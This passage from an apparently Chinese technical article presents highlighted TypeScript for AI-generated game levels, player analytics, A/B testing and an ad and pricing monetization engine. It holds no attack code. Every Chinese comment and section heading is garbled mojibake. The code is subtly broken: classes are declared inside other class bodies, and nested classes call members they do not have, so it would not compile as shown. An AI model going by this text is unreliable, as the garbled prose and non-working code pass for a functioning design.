    <span class="hljs-variable language_">this</span>.<span class="hljs-property">contentCache</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LRUCache</span>(<span class="hljs-number">100</span>)
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">templateLibrary</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateLibrary</span>()
  }
  
  <span class="hljs-comment">// ç”Ÿæˆå…³å¡å†…å®¹</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">generateLevel</span>(<span class="hljs-attr">request</span>: <span class="hljs-title class_">LevelGenerationRequest</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">GameLevel</span>&gt; {
    <span class="hljs-keyword">const</span> cacheKey = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateCacheKey</span>(request)
    
    <span class="hljs-comment">// æ£€æŸ¥ç¼“å­˜</span>
    <span class="hljs-keyword">const</span> cached = <span class="hljs-variable language_">this</span>.<span class="hljs-property">contentCache</span>.<span class="hljs-title function_">get</span>(cacheKey)
    <span class="hljs-keyword">if</span> (cached) {
      <span class="hljs-keyword">return</span> cached <span class="hljs-keyword">as</span> <span class="hljs-title class_">GameLevel</span>
    }
    
    <span class="hljs-comment">// æ„å»ºç”Ÿæˆæç¤º</span>
    <span class="hljs-keyword">const</span> prompt = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">buildLevelPrompt</span>(request)
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// è°ƒç”¨AIç”Ÿæˆ</span>
      <span class="hljs-keyword">const</span> aiResponse = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiClient</span>.<span class="hljs-title function_">generateContent</span>({
        prompt,
        <span class="hljs-attr">maxTokens</span>: <span class="hljs-number">2000</span>,
        <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.7</span>,
        <span class="hljs-attr">stopSequences</span>: [<span class="hljs-string">'END_LEVEL'</span>]
      })
      
      <span class="hljs-comment">// è§£æå’ŒéªŒè¯å†…å®¹</span>
      <span class="hljs-keyword">const</span> parsedLevel = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">parseLevelDescription</span>(aiResponse.<span class="hljs-property">content</span>)
      
      <span class="hljs-comment">// éªŒè¯å…³å¡å¯è¡Œæ€§</span>
      <span class="hljs-keyword">const</span> validation = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">contentValidator</span>.<span class="hljs-title function_">validateLevel</span>(parsedLevel)
      
      <span class="hljs-keyword">if</span> (!validation.<span class="hljs-property">valid</span>) {
        <span class="hljs-comment">// ä¿®æ­£æ— æ•ˆå†…å®¹</span>
        <span class="hljs-keyword">const</span> corrected = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">correctLevelIssues</span>(parsedLevel, validation.<span class="hljs-property">issues</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cacheAndReturn</span>(cacheKey, corrected)
      }
      
      <span class="hljs-comment">// åº”ç”¨é£æ ¼è½¬ç§»</span>
      <span class="hljs-keyword">const</span> styledLevel = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">applyStyle</span>(parsedLevel, request.<span class="hljs-property">theme</span>)
      
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cacheAndReturn</span>(cacheKey, styledLevel)
      
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'å…³å¡ç”Ÿæˆå¤±è´¥:'</span>, error)
      
      <span class="hljs-comment">// å›é€€åˆ°æ¨¡æ¿ç”Ÿæˆ</span>
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateFromTemplate</span>(request)
    }
  }
  
  <span class="hljs-comment">// ç”Ÿæˆæ¸¸æˆå‰§æƒ…</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">generateStoryline</span>(<span class="hljs-attr">params</span>: <span class="hljs-title class_">StoryParams</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">GameStory</span>&gt; {
    <span class="hljs-keyword">const</span> characterTraits = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateCharacterTraits</span>(params)
    <span class="hljs-keyword">const</span> plotPoints = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generatePlotPoints</span>(params, characterTraits)
    <span class="hljs-keyword">const</span> dialogues = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateDialogues</span>(characterTraits, plotPoints)
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">characters</span>: characterTraits,
      <span class="hljs-attr">plot</span>: plotPoints,
      dialogues,
      <span class="hljs-attr">branchingPaths</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateBranches</span>(plotPoints),
      <span class="hljs-attr">emotionalArcs</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateEmotionalArcs</span>(plotPoints)
    }
  }
  
  <span class="hljs-comment">// ä¸ªæ€§åŒ–æ¸¸æˆä½“éªŒ</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">personalizeGameExperience</span>(
    <span class="hljs-attr">playerProfile</span>: <span class="hljs-title class_">PlayerProfile</span>,
    <span class="hljs-attr">gameContext</span>: <span class="hljs-title class_">GameContext</span>
  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Personalization</span>&gt; {
    <span class="hljs-comment">// åˆ†æç©å®¶è¡Œä¸º</span>
    <span class="hljs-keyword">const</span> behaviorAnalysis = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzePlayerBehavior</span>(playerProfile)
    
    <span class="hljs-comment">// ç”Ÿæˆä¸ªæ€§åŒ–å†…å®¹</span>
    <span class="hljs-keyword">const</span> personalization = {
      <span class="hljs-attr">difficultyAdjustment</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateDifficultyAdjustment</span>(behaviorAnalysis),
      <span class="hljs-attr">contentPreferences</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">inferContentPreferences</span>(behaviorAnalysis),
      <span class="hljs-attr">learningPath</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateLearningPath</span>(behaviorAnalysis),
      <span class="hljs-attr">rewardSystem</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">personalizeRewards</span>(behaviorAnalysis),
      <span class="hljs-attr">narrativeAdaptation</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">adaptNarrative</span>(behaviorAnalysis, gameContext)
    }
    
    <span class="hljs-comment">// AIæŒç»­ä¼˜åŒ–</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupContinuousOptimization</span>(playerProfile.<span class="hljs-property">id</span>, personalization)
    
    <span class="hljs-keyword">return</span> personalization
  }
  
  <span class="hljs-comment">// å®æ—¶å†…å®¹é€‚é…</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicContentAdapter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-attr">playerFeedback</span>: <span class="hljs-title class_">PlayerFeedbackCollector</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">performanceMonitor</span>: <span class="hljs-title class_">PerformanceMonitor</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">adaptationModel</span>: <span class="hljs-title class_">AdaptationModel</span>
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">adaptContentInRealTime</span>(
      <span class="hljs-attr">content</span>: <span class="hljs-title class_">GameContent</span>,
      <span class="hljs-attr">playerActions</span>: <span class="hljs-title class_">PlayerAction</span>[]
    ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">AdaptedContent</span>&gt; {
      <span class="hljs-comment">// æ”¶é›†å®æ—¶åé¦ˆ</span>
      <span class="hljs-keyword">const</span> feedback = <span class="hljs-variable language_">this</span>.<span class="hljs-property">playerFeedback</span>.<span class="hljs-title function_">collect</span>(playerActions)
      
      <span class="hljs-comment">// åˆ†æå†…å®¹æ•ˆæœ</span>
      <span class="hljs-keyword">const</span> effectiveness = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzeContentEffectiveness</span>(content, feedback)
      
      <span class="hljs-comment">// AIå†³ç­–è°ƒæ•´</span>
      <span class="hljs-keyword">const</span> adaptation = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">adaptationModel</span>.<span class="hljs-title function_">decideAdaptation</span>({
        <span class="hljs-attr">currentContent</span>: content,
        effectiveness,
        <span class="hljs-attr">playerState</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getPlayerState</span>(),
        <span class="hljs-attr">gamePhase</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getGamePhase</span>()
      })
      
      <span class="hljs-comment">// åº”ç”¨è°ƒæ•´</span>
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">applyAdaptation</span>(content, adaptation)
    }
  }
}
</code></pre>
<h4 data-id="heading-9">3.2 æ•°æ®åˆ†æä¸AIä¼˜åŒ–</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// analytics/GameAnalytics.ts - æ•°æ®é©±åŠ¨çš„æ¸¸æˆä¼˜åŒ–</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">AnalyticsConfig</span> {
  <span class="hljs-attr">trackingEnabled</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">realtimeProcessing</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">retentionAnalysis</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">cohortTracking</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GameAnalytics</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">AnalyticsConfig</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">dataCollector</span>: <span class="hljs-title class_">DataCollector</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">eventProcessor</span>: <span class="hljs-title class_">EventProcessor</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">aiAnalyzer</span>: <span class="hljs-title class_">AIAnalyzer</span>
  
  <span class="hljs-comment">// æ•°æ®å­˜å‚¨</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">timeSeriesDB</span>: <span class="hljs-title class_">TimeSeriesDatabase</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">userProfiles</span>: <span class="hljs-title class_">UserProfileStore</span>
  
  <span class="hljs-comment">// å®æ—¶ä»ªè¡¨æ¿</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">dashboard</span>: <span class="hljs-title class_">AnalyticsDashboard</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: AnalyticsConfig</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = config
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dataCollector</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataCollector</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventProcessor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventProcessor</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiAnalyzer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AIAnalyzer</span>()
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeSeriesDB</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TimeSeriesDatabase</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userProfiles</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProfileStore</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dashboard</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnalyticsDashboard</span>()
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupTracking</span>()
  }
  
  <span class="hljs-comment">// ç©å®¶è¡Œä¸ºè¿½è¸ª</span>
  <span class="hljs-title function_">trackPlayerEvent</span>(<span class="hljs-params">event: PlayerEvent</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">trackingEnabled</span>) <span class="hljs-keyword">return</span>
    
    <span class="hljs-comment">// ä¸°å¯Œäº‹ä»¶æ•°æ®</span>
    <span class="hljs-keyword">const</span> enrichedEvent = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">enrichEventData</span>(event)
    
    <span class="hljs-comment">// å®æ—¶å¤„ç†</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">realtimeProcessing</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">processRealtimeEvent</span>(enrichedEvent)
    }
    
    <span class="hljs-comment">// å­˜å‚¨å†å²æ•°æ®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">storeEvent</span>(enrichedEvent)
    
    <span class="hljs-comment">// æ›´æ–°ç”¨æˆ·ç”»åƒ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">updateUserProfile</span>(enrichedEvent)
    
    <span class="hljs-comment">// AIåˆ†æ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiAnalyzer</span>.<span class="hljs-title function_">analyzeEventPattern</span>(enrichedEvent)
  }
  
  <span class="hljs-comment">// ç•™å­˜ç‡åˆ†æ</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">analyzeRetention</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">RetentionAnalysis</span>&gt; {
    <span class="hljs-keyword">const</span> cohorts = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">identifyCohorts</span>()
    <span class="hljs-keyword">const</span> retentionRates = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateRetentionRates</span>(cohorts)
    
    <span class="hljs-comment">// AIé¢„æµ‹æµå¤±é£é™©</span>
    <span class="hljs-keyword">const</span> churnRisk = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiAnalyzer</span>.<span class="hljs-title function_">predictChurnRisk</span>(
      cohorts,
      retentionRates
    )
    
    <span class="hljs-comment">// ç”Ÿæˆæ”¹è¿›å»ºè®®</span>
    <span class="hljs-keyword">const</span> recommendations = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateRetentionRecommendations</span>(
      cohorts,
      retentionRates,
      churnRisk
    )
    
    <span class="hljs-keyword">return</span> {
      cohorts,
      retentionRates,
      churnRisk,
      recommendations,
      <span class="hljs-attr">insights</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">extractInsights</span>(retentionRates)
    }
  }
  
  <span class="hljs-comment">// A/Bæµ‹è¯•æ¡†æ¶</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">ABTestFramework</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-attr">experiments</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Experiment</span>&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()
    <span class="hljs-keyword">private</span> <span class="hljs-attr">variantAllocator</span>: <span class="hljs-title class_">VariantAllocator</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">significanceCalculator</span>: <span class="hljs-title class_">SignificanceCalculator</span>
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">runExperiment</span>(<span class="hljs-attr">experiment</span>: <span class="hljs-title class_">ExperimentConfig</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ExperimentResult</span>&gt; {
      <span class="hljs-keyword">const</span> expId = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateExperimentId</span>(experiment)
      
      <span class="hljs-comment">// åˆ†é…å˜ä½“</span>
      <span class="hljs-keyword">const</span> variantAssignment = <span class="hljs-variable language_">this</span>.<span class="hljs-property">variantAllocator</span>.<span class="hljs-title function_">assign</span>(
        experiment.<span class="hljs-property">variants</span>,
        experiment.<span class="hljs-property">targeting</span>
      )
      
      <span class="hljs-comment">// è¿½è¸ªæŒ‡æ ‡</span>
      <span class="hljs-keyword">const</span> metrics = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">trackExperimentMetrics</span>(
        expId,
        variantAssignment,
        experiment.<span class="hljs-property">metrics</span>
      )
      
      <span class="hljs-comment">// ç»Ÿè®¡æ˜¾è‘—æ€§</span>
      <span class="hljs-keyword">const</span> significance = <span class="hljs-variable language_">this</span>.<span class="hljs-property">significanceCalculator</span>.<span class="hljs-title function_">calculate</span>(
        metrics,
        experiment.<span class="hljs-property">confidenceLevel</span>
      )
      
      <span class="hljs-comment">// AIä¼˜åŒ–å»ºè®®</span>
      <span class="hljs-keyword">const</span> optimization = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiAnalyzer</span>.<span class="hljs-title function_">optimizeExperiment</span>(
        experiment,
        metrics,
        significance
      )
      
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">experimentId</span>: expId,
        metrics,
        significance,
        <span class="hljs-attr">winningVariant</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">determineWinner</span>(metrics, significance),
        <span class="hljs-attr">recommendations</span>: optimization.<span class="hljs-property">suggestions</span>,
        <span class="hljs-attr">confidence</span>: optimization.<span class="hljs-property">confidence</span>
      }
    }
  }
  
  <span class="hljs-comment">// é¢„æµ‹åˆ†æ</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">predictPlayerLTV</span>(<span class="hljs-attr">playerId</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">LTVPrediction</span>&gt; {
    <span class="hljs-keyword">const</span> playerHistory = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getPlayerHistory</span>(playerId)
    <span class="hljs-keyword">const</span> similarPlayers = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">findSimilarPlayers</span>(playerId)
    
    <span class="hljs-keyword">const</span> prediction = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiAnalyzer</span>.<span class="hljs-title function_">predictLTV</span>({
      <span class="hljs-attr">playerProfile</span>: playerHistory.<span class="hljs-property">profile</span>,
      <span class="hljs-attr">behaviorPatterns</span>: playerHistory.<span class="hljs-property">patterns</span>,
      <span class="hljs-attr">similarPlayerLTVs</span>: similarPlayers.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.<span class="hljs-property">ltv</span>),
      <span class="hljs-attr">externalFactors</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getExternalFactors</span>()
    })
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">predictedLTV</span>: prediction.<span class="hljs-property">value</span>,
      <span class="hljs-attr">confidence</span>: prediction.<span class="hljs-property">confidence</span>,
      <span class="hljs-attr">keyDrivers</span>: prediction.<span class="hljs-property">drivers</span>,
      <span class="hljs-attr">growthOpportunities</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">identifyGrowthOpportunities</span>(playerHistory)
    }
  }
}
</code></pre>
<h3 data-id="heading-10">ç¬¬å››ç« ï¼šå°æ¸¸æˆå•†ä¸šåŒ–ä¸å¢é•¿ç³»ç»Ÿ</h3>
<h4 data-id="heading-11">4.1 AIé©±åŠ¨çš„å•†ä¸šåŒ–å¼•æ“</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// monetization/AIMonetizationEngine.ts - æ™ºèƒ½å•†ä¸šåŒ–ç³»ç»Ÿ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MonetizationConfig</span> {
  <span class="hljs-attr">revenueModels</span>: <span class="hljs-title class_">RevenueModel</span>[]
  <span class="hljs-attr">pricingStrategy</span>: <span class="hljs-title class_">PricingStrategy</span>
  <span class="hljs-attr">adPlacement</span>: <span class="hljs-title class_">AdPlacementStrategy</span>
  <span class="hljs-attr">iapOptimization</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AIMonetizationEngine</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">MonetizationConfig</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">pricingModel</span>: <span class="hljs-title class_">PricingModel</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">adOptimizer</span>: <span class="hljs-title class_">AdOptimizer</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">iapManager</span>: <span class="hljs-title class_">IAPManager</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">subscriptionService</span>: <span class="hljs-title class_">SubscriptionService</span>
  
  <span class="hljs-comment">// AIé¢„æµ‹æ¨¡å‹</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">conversionPredictor</span>: <span class="hljs-title class_">ConversionPredictor</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">priceOptimizer</span>: <span class="hljs-title class_">PriceOptimizer</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">bundleRecommender</span>: <span class="hljs-title class_">BundleRecommender</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: MonetizationConfig</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = config
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pricingModel</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PricingModel</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">adOptimizer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdOptimizer</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">iapManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IAPManager</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">subscriptionService</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubscriptionService</span>()
    
    <span class="hljs-comment">// åˆå§‹åŒ–AIæ¨¡å‹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">conversionPredictor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConversionPredictor</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">priceOptimizer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriceOptimizer</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bundleRecommender</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleRecommender</span>()
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupRevenueTracking</span>()
  }
  
  <span class="hljs-comment">// åŠ¨æ€å®šä»·ç­–ç•¥</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">calculateOptimalPrice</span>(<span class="hljs-attr">product</span>: <span class="hljs-title class_">VirtualProduct</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">OptimalPrice</span>&gt; {
    <span class="hljs-keyword">const</span> marketAnalysis = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzeMarketConditions</span>()
    <span class="hljs-keyword">const</span> playerValue = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculatePlayerValue</span>(product.<span class="hljs-property">targetPlayers</span>)
    
    <span class="hljs-keyword">const</span> optimalPrice = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">priceOptimizer</span>.<span class="hljs-title function_">calculate</span>({
      product,
      marketAnalysis,
      playerValue,
      <span class="hljs-attr">competitorPrices</span>: <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getCompetitorPrices</span>(product.<span class="hljs-property">category</span>),
      <span class="hljs-attr">elasticity</span>: <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculatePriceElasticity</span>(product)
    })
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">price</span>: optimalPrice.<span class="hljs-property">amount</span>,
      <span class="hljs-attr">currency</span>: optimalPrice.<span class="hljs-property">currency</span>,
      <span class="hljs-attr">confidence</span>: optimalPrice.<span class="hljs-property">confidence</span>,
      <span class="hljs-attr">rationale</span>: optimalPrice.<span class="hljs-property">explanation</span>,
      <span class="hljs-attr">suggestedTests</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generatePriceTests</span>(optimalPrice)
    }
  }
  
  <span class="hljs-comment">// ä¸ªæ€§åŒ–å¹¿å‘Šç­–ç•¥</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">optimizeAdExperience</span>(<span class="hljs-attr">playerProfile</span>: <span class="hljs-title class_">PlayerProfile</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">AdStrategy</span>&gt; {
    <span class="hljs-keyword">const</span> playerPreferences = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">inferAdPreferences</span>(playerProfile)
    <span class="hljs-keyword">const</span> engagementPatterns = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzeAdEngagement</span>(playerProfile)
    <span class="hljs-keyword">const</span> lifetimeValue = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">predictPlayerLTV</span>(playerProfile.<span class="hljs-property">id</span>)
    
    <span class="hljs-keyword">const</span> strategy = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">adOptimizer</span>.<span class="hljs-title function_">determineStrategy</span>({
      <span class="hljs-attr">player</span>: playerProfile,
      <span class="hljs-attr">preferences</span>: playerPreferences,
      <span class="hljs-attr">engagement</span>: engagementPatterns,
      <span class="hljs-attr">ltv</span>: lifetimeValue,
      <span class="hljs-attr">context</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getGameContext</span>()
    })
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">adFrequency</span>: strategy.<span class="hljs-property">frequency</span>,
      <span class="hljs-attr">adTypes</span>: strategy.<span class="hljs-property">adTypes</span>,
      <span class="hljs-attr">placement</span>: strategy.<span class="hljs-property">placement</span>,
      <span class="hljs-attr">timing</span>: strategy.<span class="hljs-property">timing</span>,
      <span class="hljs-attr">incentives</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">determineAdIncentives</span>(strategy, lifetimeValue)
    }
  }
  
  <span class="hljs-comment">// AIæ¨èç³»ç»Ÿ</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">AIProductRecommender</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-attr">collaborativeFiltering</span>: <span class="hljs-title class_">CollaborativeFiltering</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">contentBasedFiltering</span>: <span class="hljs-title class_">ContentBasedFiltering</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">reinforcementLearning</span>: <span class="hljs-title class_">ReinforcementLearning</span>
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">recommendProducts</span>(
      <span class="hljs-attr">playerId</span>: <span class="hljs-built_in">string</span>,
      <span class="hljs-attr">context</span>: <span class="hljs-title class_">RecommendationContext</span>
    ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ProductRecommendation</span>[]&gt; {
      <span class="hljs-comment">// å¤šç®—æ³•æ··åˆæ¨è</span>
      <span class="hljs-keyword">const</span> collaborativeRecs = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">collaborativeFiltering</span>.<span class="hljs-title function_">recommend</span>(
        playerId,
        context
      )
      
      <span class="hljs-keyword">const</span> contentRecs = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">contentBasedFiltering</span>.<span class="hljs-title function_">recommend</span>(
        playerId,
        context
      )
      
      <span class="hljs-comment">// å¼ºåŒ–å­¦ä¹ ä¼˜åŒ–</span>
      <span class="hljs-keyword">const</span> optimizedRecs = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">reinforcementLearning</span>.<span class="hljs-title function_">optimize</span>(
        [...collaborativeRecs, ...contentRecs],
        <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getPlayerHistory</span>(playerId)
      )
      
      <span class="hljs-comment">// ç”Ÿæˆè§£é‡Š</span>
      <span class="hljs-keyword">const</span> explainedRecs = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateExplanations</span>(optimizedRecs, playerId)
      
      <span class="hljs-keyword">return</span> explainedRecs
    }
    
    <span class="hljs-comment">// A/Bæµ‹è¯•ä¼˜åŒ–</span>
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">optimizeRecommendationAlgorithm</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">OptimizationResult</span>&gt; {
